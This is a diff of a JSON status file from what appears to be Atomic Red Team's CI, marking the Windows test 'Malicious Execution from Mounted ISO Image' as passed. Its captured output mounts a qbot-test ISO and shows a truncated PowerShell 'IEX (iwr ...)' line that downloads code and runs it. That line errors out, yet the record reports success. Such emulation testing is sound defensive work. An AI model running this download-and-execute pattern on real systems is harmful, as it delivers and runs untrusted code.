@@ -2,12 +2,11 @@
   "guid": "e9795c8d-42aa-4ed4-ad80-551ed793d006",
   "platforms": {
     "windows": {
-      "consecutive_failures": 1,
-      "last_status": "failed",
-      "stdout": "",
+      "consecutive_failures": 0,
+      "last_status": "passed",
+      "stdout": "PathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nCheckPrereq's for: \r\nT1204.003-1 Malicious Execution from Mounted ISO Image\r\n\r\nPrerequisites met: \r\nT1204.003-1 Malicious Execution from Mounted ISO Image\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting test: \r\nT1204.003-1 Malicious Execution from Mounted ISO Image\r\n\r\nAttached          : True\r\nBlockSize         : 0\r\nDevicePath        : \\\\.\\CDROM0\r\nFileSize          : 1245184\r\nImagePath         : C:\\Users\\RUNNER~1\\AppData\\Local\\Temp\\qbot-test.iso\r\nLogicalSectorSize : 2048\r\nNumber            : 0\r\nSize              : 1245184\r\nStorageType       : 1\r\nPSComputerName    :\r\nInvoke-Expression : Cannot bind argument to parameter 'Command' because it is null.\r\nAt line:1 char:8\r\n+ & {IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red ...\r\n+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : InvalidData: (:) [Invoke-Expression], ParameterBindingValidationException\r\n    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.InvokeExpre \r\n   ssionCommand\r\nExit code: 0\r\nDone executing test: \r\nT1204.003-1 Malicious Execution from Mounted ISO Image\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting cleanup for test: \r\nT1204.003-1 Malicious Execution from Mounted ISO Image\r\n\r\nAttached          : False\r\nBlockSize         : 0\r\nDevicePath        : \r\nFileSize          : 1245184\r\nImagePath         : C:\\Users\\RUNNER~1\\AppData\\Local\\Temp\\qbot-test.iso\r\nLogicalSectorSize : 2048\r\nNumber            : \r\nSize              : 1245184\r\nStorageType       : 1\r\nPSComputerName    :\r\nstop-process : Cannot find a process with the name \"Calculatorapp\". Verify the process name and call the cmdlet again.\r\nAt line:2 char:1\r\n+ stop-process -Name \"Calculatorapp\" -Force\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Calculatorapp:String) [Stop-Process], ProcessCommandException\r\n    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand\r\nDone executing cleanup for test: \r\nT1204.003-1 Malicious Execution from Mounted ISO Image\r\n\r\n",
       "stderr": "",
-      "exit_code": 1,
-      "last_error": "The process cannot access the file 'C:\\Users\\runneradmin\\AppData\\Local\\Temp\\tmpufykkw.tmp' because it is being used by another process."
+      "exit_code": 0
     }
   }
 }
